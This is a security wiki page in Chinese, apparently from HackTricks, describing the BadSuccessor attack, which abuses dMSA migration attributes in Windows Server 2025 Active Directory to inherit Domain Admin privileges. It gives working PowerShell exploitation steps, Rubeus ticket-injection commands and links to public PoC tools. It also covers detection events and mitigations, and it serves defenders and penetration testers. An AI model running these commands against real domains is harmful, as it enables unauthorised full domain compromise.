# BadSuccessor：通过 Delegated MSA Migration Abuse 进行 Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 概述

Delegated Managed Service Accounts（**dMSA**）是随 Windows Server 2025 发布的新一代 **gMSA** successor。合法的 migration workflow 允许管理员使用 dMSA 替换一个*旧* account（user、computer 或 service account），同时透明地保留其 permissions。该 workflow 通过 `Start-ADServiceAccountMigration` 和 `Complete-ADServiceAccountMigration` 等 PowerShell cmdlets 提供，并依赖 **dMSA object** 的两个 LDAP attributes：

* **`msDS-ManagedAccountPrecededByLink`** – 指向被替换（旧）account 的 *DN link*。
* **`msDS-DelegatedMSAState`**       – migration state（`0` = none，`1` = in-progress，`2` = *completed*）。<sup>[[1]](#references)</sup>

如果 attacker 能够在一个 OU 中创建**任意** dMSA，并直接操纵这两个 attributes，LSASS 和 KDC 就会将该 dMSA 视为所链接 account 的 *successor*。当 attacker 随后以该 dMSA 进行 authentication 时，**他们会继承所链接 account 的全部 privileges**——如果链接的是 Administrator account，最高可达 **Domain Admin**。<sup>[[1]](#references)</sup>

该 technique 于 2025 年由 Unit 42 命名为 **BadSuccessor**。截至本文撰写时，**尚无 security patch** 可用；只有强化 OU permissions 才能缓解此问题。<sup>[[1]](#references)[[2]](#references)</sup>

### Attack prerequisites

1. 一个被*允许*在**Organizational Unit（OU）**内创建 objects 的 account，并且至少具有以下权限之一：
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`**（generic create）
2. 连接 LDAP 和 Kerberos 的网络 connectivity（标准 domain joined 场景 / remote attack）。<sup>[[1]](#references)</sup>

## 枚举 Vulnerable OUs

Unit 42 发布了一个 PowerShell helper script，用于解析每个 OU 的 security descriptors，并突出显示所需的 ACEs：<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
在底层，该脚本会对 `(objectClass=organizationalUnit)` 执行分页 LDAP 搜索，并检查每个 `nTSecurityDescriptor` 是否包含

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8`（对象类 *msDS-DelegatedManagedServiceAccount*）

## Exploitation Steps

识别出可写 OU 后，该攻击只需执行 3 次 LDAP 写入：<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
复制完成后，攻击者可以直接以 `attacker_dMSA$` **logon**，或请求 Kerberos TGT —— Windows 将构建*被替代*账户的令牌。<sup>[[1]](#references)</sup>

### 自动化

多个公开的 PoC 封装了包括密码检索和 ticket 管理在内的完整工作流：

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

在 OU 上启用 **Object Auditing**，并监控以下 Windows Security Events：<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – 创建 **dMSA** 对象
* **5136** – 修改 **`msDS-ManagedAccountPrecededByLink`**
* **4662** – 特定属性变更
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – 为 dMSA 签发 TGT

关联 `4662`（属性修改）、`4741`（创建计算机/服务账户）和 `4624`（后续登录）可以快速识别 BadSuccessor 活动。XDR 解决方案（例如 **XSIAM**）提供开箱即用的查询（参见 references）。<sup>[[2]](#references)</sup>

## Mitigation

* 遵循 **least privilege** 原则——仅将 *Service Account* 管理权限委派给可信角色。
* 从不明确需要这些权限的 OU 中移除 `Create Child` / `msDS-DelegatedManagedServiceAccount`。
* 监控上述事件 ID，并对创建或编辑 dMSA 的 *non-Tier-0* 身份发出告警。

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor：滥用 dMSA 在 Active Directory 中提升权限 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – 当良好账户变坏：利用 Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
